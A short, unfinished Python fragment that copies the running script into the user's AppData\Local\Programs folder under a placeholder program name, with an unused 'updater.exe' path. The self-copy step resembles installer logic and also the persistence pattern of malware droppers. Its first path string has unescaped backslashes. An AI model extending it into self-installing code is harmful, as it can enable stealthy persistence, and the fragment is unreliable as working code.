#import library
import sys
import os
import shutil

class file_manager:
    def __init__(self):
        self.path = sys.argv[0]
        self.main_path = os.path.expanduser('~')+f"\AppData\Local\Programs\#Programname.exe"
        self.updater_path = os.path.expanduser('~')+f"\\AppData\\Local\\Programs\\updater.exe"

    def copy_file(self):
        shutil.copy(self.path, self.main_path)